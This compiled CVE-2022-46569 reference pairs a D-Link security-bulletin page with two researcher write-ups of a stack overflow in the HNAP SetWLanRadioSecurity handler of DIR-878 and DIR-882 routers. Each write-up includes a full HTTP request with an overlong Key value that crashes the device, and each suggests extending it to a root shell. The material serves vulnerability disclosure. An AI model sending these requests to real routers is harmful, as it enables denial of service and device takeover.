2022/46xxx/CVE-2022-46569/refined/combined.md

=== Content from www.dlink.com_a0b13c21_20250115_080846.html ===


* For Home
  + [Wi-Fi](/en/for-home/wifi)
  + [4G/5G](/en/for-home/wifi/4g-5g)
  + [Cameras](/en/for-home/cameras)
  + [Smart Home](/en/for-home/smart-home-ecosystems)
  + [Switches](/en/for-home/switches)
  + [Adapters](/en/for-home/accessories)
  + [mydlink](/en/for-home/mydlink-hq)
* For Business
  + [Switches](/en/for-business/switching)
  + [Wireless](/en/for-business/wireless)
  + [Business Routers](/en/for-business/business-routers)
  + [Nuclias](/en/for-business/nuclias "Nuclias cloud managed networks")
  + [IP Surveillance](/en/for-business/ip-surveillance)
  + [Industrial](/en/for-business/industrial-switches)
  + [Accessories](/en/for-business/accessories)
* For Industry
  + [4G / 5G M2M](/en/for-service-provider/mobile)
* [Support](https://www.dlink.com/en/hq-support)* [Resources](/en/hq-download-center)

![]()

GB|EN

* [![](/en/-/media/icon-library/navigation/hq/r32_250w.png)
  Wi-Fi](/en/for-home/wifi)
* [![](/en/-/media/icon-library/navigation/hq/g530a1image-lsideright.png)
  4G/5G](/en/for-home/wifi/4g-5g)
* [![](/en/-/media/icon-library/navigation/hq/dcs8302lh250w.png)
  Cameras](/en/for-home/cameras)
* [![](/en/-/media/icon-library/navigation/hq/dspw118250w.png)
  Smart Home](/en/for-home/smart-home-ecosystems)
* [![](/en/-/media/icon-library/navigation/hq/dms106xt250w.png)
  Switches](/en/for-home/switches)
* [![](/en/-/media/icon-library/navigation/hq/dwaf18250w.png)
  Adapters](/en/for-home/accessories)
* [![](/en/-/media/icon-library/navigation/hq/mydlink_2502.png)
  mydlink](/en/for-home/mydlink-hq)

* [![](/en/-/media/icon-library/navigation/hq/des1024d250w.png)
  Switches](/en/for-business/switching)
* [![](/en/-/media/icon-library/navigation/hq/dwlx8630ap250w.png)
  Wireless](/en/for-business/wireless)
* [![](/en/-/media/icon-library/navigation/hq/dsr250250w.png)
  Business Routers](/en/for-business/business-routers)
* [![](/en/-/media/icon-library/navigation/hq/nuclias_250w.png)
  Nuclias](/en/for-business/nuclias)
* [![](/en/-/media/icon-library/navigation/hq/dcs4718e250w.png)
  IP Surveillance](/en/for-business/ip-surveillance)
* [![](/en/-/media/icon-library/navigation/hq/dis300g250w.png)
  Industrial](/en/for-business/industrial-switches)
* [![](/en/-/media/icon-library/navigation/hq/dpe101g250w.png)
  Accessories](/en/for-business/accessories)

* [![](/en/-/media/icon-library/navigation/hq/dwm321250w.png)
  4G / 5G M2M](/en/for-service-provider/mobile)

* [![](/en/-/media/icon-library/navigation/portal-tools.png)
  Tech Support](/en/support)
* [![](/en/-/media/icon-library/navigation/support-tech-alerts.png)
  Tech Alerts](/en/support/support-news)
* [![](/en/-/media/icon-library/navigation/faqs.png)
  FAQs](/en/support/faq)
* [![](/en/-/media/icon-library/navigation/support-services.png)
  Services](/en/for-business/services)
* [![](/en/-/media/icon-library/navigation/support-warranty.png)
  Warranty](/en/support/warranty-information)
* [![](/en/-/media/icon-library/navigation/support-contact.png)
  Contact](/en/support/contact)
* [![](/en/-/media/icon-library/navigation/support-tickets.png)
  Support Portal](https://services.eu.dlink.com/home/main/SSPLogin.aspx?language=E)

* [![](/en/-/media/icon-library/navigation/brochures-and-guides.png)
  Brochures and Guides](/en/resource-centre/brochures-and-guides)
* [![](/en/-/media/icon-library/navigation/case-studies.png)
  Case Studies](/en/resource-centre/case-studies)
* [![](/en/-/media/icon-library/navigation/videos-icon.png)
  Videos](/en/resource-centre/videos)
* [![](/en/-/media/icon-library/navigation/blog.png)
  Blog](/en/resource-centre/blog)
* [![](/en/-/media/icon-library/navigation/portal-product-selector.png)
  Product Selector](http://tools.dlink.com/productselector/uk/wireless_psp01.asp)

* Security Bulletin

# Security Bulletin

###

##

###

## Stay updated on the latest security vulnerabilities

The security and performance of your D-Link devices is of utmost importance to us across all product lines. This Security Bulletin is published for security issues that directly involve D-Link products and require an upgrade, fix, or other customer action. In all security publications, D-Link discloses the minimum amount of information required for an end-user to assess the impact of a vulnerability and any potential steps needed to protect their environment.

D-Link does not provide vulnerability details that could enable someone to craft an exploit.

To report a security vulnerability, please contact [Report Vulnerability](https://support.dlink.com/SecurityAdvisories.aspx).

To learn more about our EOL policy, please [click here.](/en/eol-policy)

To check the latest Security Bulletin, please [click here.](https://supportannouncement.us.dlink.com/)

* For Home
  For Home
  [Wi‑Fi](/en/for-home/wifi)

  [4G & 5G](/en/for-home/wifi/4g-5g)

  [Cameras](/en/for-home/cameras)

  [Smart Home](/en/for-home/smart-home-ecosystems)

  [Switches](/en/for-home/switches)

  [Accessories](/en/for-home/accessories)

  [mydlink](/en/for-home/mydlink-hq)

* For Business
  For Business
  [Switches](/en/for-business/switching)

  [Wireless](/en/for-business/wireless)

  [Business Routers](/en/for-business/business-routers)

  [Nuclias](/en/for-business/nuclias)

  [IP Surveillance](/en/for-business/ip-surveillance)

  [Industrial](/en/for-business/industrial-switches)

  [Accessories](/en/for-business/accessories)

* For Service Providers
  For Service Providers
  [Fixed](/en/for-service-provider/fixed)

  [Mobile](/en/for-service-provider/mobile)

  [Wireless](/en/for-service-provider/wireless)

* D‑Link
  D‑Link
  [About Us](/en/about)

  [Sustainability](https://company.dlink.com/en/esg/landing)

  [Press Releases](/en/press-centre/press-releases)

  [Events](/en/hq-events)

  [Contact](/en/contact-d-link)

  [Awards](https://company.dlink.com/en/esg/awards/)

  [Security Bulletin](/en/security-bulletin)

  [EOL Policy](/en/end-of-life-policy)

  [Tech Notification](/en/tech-notification)

  [Where To Buy](/en/for-home/where-to-buy)

![]()

GB|EN

* [Privacy](/en/privacy)
* [Terms of use](/en/terms-of-use)
* [Sitemap](/en/sitemap)

© D-Link Corporation. All rights reserved. No. 289, Xinhu 3rd Road Neihu District, Taipei 11494 Taiwan



=== Content from hackmd.io_bc17184b_20250115_080843.html ===


# D-Link DIR-878 was discovered stack overflow in the SetWLanRadioSecurity module
###### tags: `D-Link` `DIR-878`
vendor:D-Link
product:DIR-878
version:DIR\_878\_FW1.30B08.bin
type:Stack Overflow
author:Wolin Zhuang, Yifeng Li;
## Vulnerability Description
D-Link DIR-878 DIR\_878\_FW1.30B08.bin was discovered to contain a stack overflow via the Key parameter in the SetWLanRadioSecurity module.
## Vulnerability Details
In module SetWLanRadioSecurity,the content obtained by the program through /SetWLanRadioSecurity/Key is passed to v23, which is controllable for attacker and then passed into fuction decrypt\_aes as a parameter.
![](https://i.imgur.com/tb6rDM7.png)
![](https://i.imgur.com/o4YAWMg.png)
![](https://i.imgur.com/Qacska1.png)
After that, it is passed into function sub\_426D74 as the first parameter as a2.Besides, we notice that local variable v6 is placed on the stack, which is also passed into function sub\_426D74 as the second parameter.
![](https://i.imgur.com/DDR99OK.png)
In function sub\_426D74, the for loop from line 26 to line 32, first copy a1 to v7 then strtol transfer v7 to a2, which briefly, a2 equals hexdecode(a1).Let's start over again, a1, comes from a2 in function decrypt\_aes, a variable is controllable to the attacker.And a2 comes from v6 in function decrypt\_aes which is placed on the stack, so when we copy a1 to a2 in sub\_426D74, we are basically putting v4's value into v6, which leads to a stack overflow vulnerbility .
![](https://i.imgur.com/dTeLfRi.png)
## Recurring vulnerabilities and POC
In order to reproduce the vulnerability, the following steps can be followed:
1. Install firmware DIR\_878\_FW1.30B08.bin to router DIR878
2. Login to 192.168.0.1 as admin
3. Attack with the following POC
![](https://i.imgur.com/pulK4fi.png)
![](https://i.imgur.com/cjbC8LY.png)
```
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
Content-Length: 2903
Accept: \*/\*
X-Requested-With: XMLHttpRequest
HNAP\_AUTH: 6308CC54400705CDC272C5CDED0255EA 1675664856301
SOAPAction: "http://purenetworks.com/HNAP1/SetMultipleActions"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Content-Type: text/xml; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/GuestZone.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uid=S6ZOyU04
Connection: close
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetMultipleActions xmlns="http://purenetworks.com/HNAP1/"><SetWLanRadioSettings xmlns="http://purenetworks.com/HNAP1/"><RadioID>RADIO\_2.4GHz\_Guest</RadioID><Enabled>true</Enabled><Mode>802.11bgn</Mode><SSID>dlink-guest</SSID><SSIDBroadcast>true</SSIDBroadcast><ChannelWidth>40</ChannelWidth><Channel>0</Channel><SecondaryChannel>0</SecondaryChannel><QoS>true</QoS><ScheduleName>Always</ScheduleName><TXPower></TXPower><Coexistence>false</Coexistence><MUMIMOEnabled>true</MUMIMOEnabled><BandSteeringEnabled>true</BandSteeringEnabled><AirTimeFairnessEnabled>true</AirTimeFairnessEnabled></SetWLanRadioSettings><SetWLanRadioSecurity xmlns="http://purenetworks.com/HNAP1/"><RadioID>RADIO\_2.4GHz\_Guest</RadioID><Enabled>true</Enabled><Type>WPAORWPA2-PSK</Type><Encryption>TKIPORAES</Encryption><KeyRenewal>3600</KeyRenewal><RadiusIP1></RadiusIP1><RadiusPort1></RadiusPort1><RadiusSecret1></RadiusSecret1><RadiusIP2></RadiusIP2><RadiusPort2></RadiusPort2><RadiusSecret2></RadiusSecret2><Key>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</Key></SetWLanRadioSecurity><SetWLanRadioSettings xmlns="http://purenetworks.com/HNAP1/"><RadioID>RADIO\_5GHz\_Guest</RadioID><Enabled>true</Enabled><Mode>802.11anac</Mode><SSID>dlink-guest</SSID><SSIDBroadcast>true</SSIDBroadcast><ChannelWidth>1</ChannelWidth><Channel>0</Channel><SecondaryChannel>0</SecondaryChannel><QoS>true</QoS><ScheduleName>Always</ScheduleName><TXPower></TXPower><Coexistence>false</Coexistence><MUMIMOEnabled>true</MUMIMOEnabled><BandSteeringEnabled>true</BandSteeringEnabled><AirTimeFairnessEnabled>true</AirTimeFairnessEnabled></SetWLanRadioSettings><SetWLanRadioSecurity xmlns="http://purenetworks.com/HNAP1/"><RadioID>RADIO\_5GHz\_Guest</RadioID><Enabled>false</Enabled><Type></Type><Encryption></Encryption><KeyRenewal></KeyRenewal><RadiusIP1></RadiusIP1><RadiusPort1></RadiusPort1><RadiusSecret1></RadiusSecret1><RadiusIP2></RadiusIP2><RadiusPort2></RadiusPort2><RadiusSecret2></RadiusSecret2><Key>2d6d4d12a46ef600678580a6573e51612d6d4d12a46ef600678580a6573e51612d6d4d12a46ef600678580a6573e51612d6d4d12a46ef600678580a6573e5161</Key></SetWLanRadioSecurity><SetGuestZoneRouterSettings xmlns="http://purenetworks.com/HNAP1/"><InternetAccessOnly>true</InternetAccessOnly><IPAddress></IPAddress><SubnetMask></SubnetMask><DHCPServer>true</DHCPServer><DHCPRangeStart></DHCPRangeStart><DHCPRangeEnd></DHCPRangeEnd><DHCPLeaseTime>0</DHCPLeaseTime></SetGuestZoneRouterSettings></SetMultipleActions></soap:Body></soap:Envelope>
```
By sending delicately constructed data package as the poc above, we can cause a stack overflow error, leading to denial of service.
![](https://i.imgur.com/DMgwV2R.png)
You can write your own exp to get the root shell.

×
### Sign in

Email

Password

[Forgot password](https://hackmd.io/settings/forgotPassword)

or

By clicking below, you agree to our [terms of service](https://hackmd.io/s/terms).

[Sign in via Facebook](https://hackmd.io/auth/facebook)
[Sign in via Twitter](https://hackmd.io/auth/twitter)
[Sign in via GitHub](https://hackmd.io/auth/github)
[Sign in via Dropbox](https://hackmd.io/auth/dropbox)
![](https://hackmd.io/images/wallet.svg)
Sign in with Wallet

Wallet
(

)
Connect another wallet

New to HackMD? [Sign up](https://hackmd.io/join)



=== Content from hackmd.io_b48dd16f_20250115_080845.html ===


# D-link DIR882-3
###### tags: `D-Link` `DIR-882`
vendor:D-link
product:DIR882
version:DIR882A1\_FW130B06.bin
type:Stack Overflow
author:Yifeng Li, Wolin Zhuang;
## Vulnerability Details
![](https://i.imgur.com/XcAgiDd.png)
In module SetWLanRadioSecurity,the content obtained by the program through /SetWLanRadioSecurity/Key is passed to v23, which is controllable for attacker and then passed into fuction decrypt\_aes as a parameter.
![](https://i.imgur.com/tb6rDM7.png)
![](https://i.imgur.com/o4YAWMg.png)
![](https://i.imgur.com/Qacska1.png)
After that, it is passed into function sub\_426D74 as the first parameter as a2.Besides, we notice that local variable v6 is placed on the stack, which is also passed into function sub\_426D74 as the second parameter.
![](https://i.imgur.com/DDR99OK.png)
In function sub\_426D74, the for loop from line 26 to line 32, first copy a1 to v7 then strtol transfer v7 to a2, which briefly, a2 equals hexdecode(a1).Let's start over again, a1, comes from a2 in function decrypt\_aes, a variable is controllable to the attacker.And a2 comes from v6 in function decrypt\_aes which is placed on the stack, so when we copy a1 to a2 in sub\_426D74, we are basically putting v4's value into v6, which leads to a stack overflow vulnerbility .
![](https://i.imgur.com/dTeLfRi.png)
## Recurring vulnerabilities and POC
In order to reproduce the vulnerability, the following steps can be followed:
1. Install firmware DIR882A1\_FW130B06.bin to router DIR882
2. Login to 192.168.0.1 as admin
3. Attack with the following POC
![](https://i.imgur.com/SPDDY99.png)
```
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
Content-Length: 871
Accept: text/xml
HNAP\_AUTH: 988C080CAF31AA9C891CE97E93A57876 1669787717826
SOAPACTION: "http://purenetworks.com/HNAP1/SetWLanRadioSecurity"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Content-Type: text/xml
Origin: http://192.168.0.1
Referer: http://192.168.0.1/GuestZone.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uid=J7THq%2FoZ
Connection: close
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SetWLanRadioSecurity xmlns="http://purenetworks.com/HNAP1/">
<RadioID>RADIO\_2.4GHz\_Guest</RadioID>
<Enabled>true</Enabled>
<Type>WPAORWPA2-PSK</Type>
<Encryption>TKIPORAES</Encryption>
<Key>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</Key>
<KeyRenewal>3600</KeyRenewal>
<RadiusIP1/>
<RadiusPort1/>
<RadiusSecret1/>
<RadiusIP2/>
<RadiusPort2/>
<RadiusSecret2/>
</SetWLanRadioSecurity>
</soap:Body>
</soap:Envelope>
```
By sending delicately constructed data package as the poc above, we can cause a stack overflow error, leading to dos circunstance.You can write your own exp to get the root shell.
![](https://i.imgur.com/eqcTBOD.png)

×
### Sign in

Email

Password

[Forgot password](https://hackmd.io/settings/forgotPassword)

or

By clicking below, you agree to our [terms of service](https://hackmd.io/s/terms).

[Sign in via Facebook](https://hackmd.io/auth/facebook)
[Sign in via Twitter](https://hackmd.io/auth/twitter)
[Sign in via GitHub](https://hackmd.io/auth/github)
[Sign in via Dropbox](https://hackmd.io/auth/dropbox)
![](https://hackmd.io/images/wallet.svg)
Sign in with Wallet

Wallet
(

)
Connect another wallet

New to HackMD? [Sign up](https://hackmd.io/join)


